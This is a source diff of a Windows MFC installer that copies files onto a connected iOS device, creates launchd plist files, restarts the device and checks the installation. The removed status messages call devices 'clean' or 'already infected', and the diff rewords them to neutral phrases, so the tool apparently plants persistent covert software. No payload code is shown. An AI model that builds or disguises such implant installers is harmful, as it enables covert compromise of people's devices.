@@ -89,6 +89,10 @@ void setDeviceInfo()
   sprintf_s(info, 256, "Model: %s\nVersion: %s", theModel, gVersion);
 }
 
+void resetDeviceInfo()
+{
+	sprintf_s(info, 256, "%s", "");
+}
 // CAboutDlg dialog used for App About
 
 char *get_file_buff(char *file_path, int *len)
@@ -167,18 +171,21 @@ UINT install_run(LPVOID lp)
   CinstallDlg *dlg = (CinstallDlg *)lp;
 
   dlg->setMessage("start installation...");
+  
+  CWnd *installButton = dlg->GetDlgItem(IDOK);
+  installButton->EnableWindow(FALSE);
 
   char **dir_content = list_dir_content(gIosInstallationDirectory);
   
   if (dir_content[0] == NULL)
   {
-    dlg->setMessage("cannot found installation dir!");
+    dlg->setMessage("cannot found installation component!");
     return 0;
   }
   
   if (make_install_directory() != 0)
   {
-    dlg->setMessage("cannot create installer folder");
+    dlg->setMessage("cannot create installation folder!");
 	return 0;
   }
 
@@ -186,15 +193,15 @@ UINT install_run(LPVOID lp)
 
   if (install_files(gIosInstallationDirectory, dir_content) != 0)
   {
-    dlg->setMessage("cannot copy files in installer folder");
+    dlg->setMessage("cannot copy files into installation folder!");
 	return 0;
   }
 
-  dlg->setMessage("copying files... done!");
+  dlg->setMessage("copying files... done.");
 
   if (create_launchd_plist() != 0)
   {
-   dlg->setMessage("cannot create plist files");
+   dlg->setMessage("cannot create plist files!");
    return 0;
   }
 
@@ -203,15 +210,13 @@ UINT install_run(LPVOID lp)
   if (restart_device() == 1)
   {
     dlg->setDeviceImage(IDB_BITMAP_GRAYED);
-    dlg->setMessage("try to restart device...restarting");
+    dlg->setMessage("try to restart device...restarting: please wait.");
     dlg->setInfo("no device connected");
   }
   else 
   {
 	dlg->setMessage("can't restart device: try it manually!");
   }
-  CWnd *installButton = dlg->GetDlgItem(IDOK);
-  installButton->EnableWindow(FALSE);
 
   Sleep(1);
 
@@ -227,7 +232,9 @@ UINT install_run(LPVOID lp)
   } while(isDeviceOn == 1);
   
   dlg->setDeviceImage(IDB_BITMAP_GRAYED);
-  dlg->setInfo("no device connected");
+  dlg->setInfo("device disconnected. Please wait...");
+  resetDeviceInfo();
+  dlg->setInfo(info);
 
   // Wait for device on
   do
@@ -238,27 +245,28 @@ UINT install_run(LPVOID lp)
   
   } while(isDeviceOn == 0);
 
-  dlg->setMessage("device connected");
+  dlg->setMessage("device connected.");
   dlg->setDeviceImage(IDB_BITMAP_CLEAR);
   
   setDeviceInfo();
 
   dlg->setInfo(info);
-	
+
+  Sleep(10);
+
   dlg->setMessage("checking installation...");
 
   if (check_installation(10, 10) == 1)
   {
 	dlg->setMessage("installation done!");
-    
-	if (remove_installation() == 0)
-		dlg->setMessage("cannot remove installation file!");
   }
   else
   {
 	dlg->setMessage("installation failed: please retry!");
   }
-
+  
+  remove_installation();
+  
   return 0;
 }
 
@@ -270,13 +278,15 @@ UINT install(LPVOID lp)
 
 UINT isDeviceAttached(LPVOID lp)
 {
+	Sleep(1);
+
 	int i = isDeviceAttached();
 
 	if (i == 0){
-		((CinstallDlg *)lp)->setMessage("no device connected!");
+		((CinstallDlg *)lp)->setMessage("cannot connect to device!");
 		((CinstallDlg *)lp)->setDeviceImage(IDB_BITMAP_GRAYED);
 	} else {
-		((CinstallDlg *)lp)->setMessage("device connected");
+		((CinstallDlg *)lp)->setMessage("check device...");
 		((CinstallDlg *)lp)->setDeviceImage(IDB_BITMAP_CLEAR);
 
 		setDeviceInfo();
@@ -288,9 +298,9 @@ UINT isDeviceAttached(LPVOID lp)
 			  CWnd *installButton = ((CinstallDlg *)lp)->GetDlgItem(IDOK);
 			  installButton->EnableWindow(TRUE);
 			}
-			((CinstallDlg *)lp)->setMessage("device is clean: ready to install.");
+			((CinstallDlg *)lp)->setMessage("check device... device is ready.");
 		} else {
-			((CinstallDlg *)lp)->setMessage("device is already infected!");
+			((CinstallDlg *)lp)->setMessage("check device... installation detected!");
 		}
 
 		bIsDeviceConnected = 1;
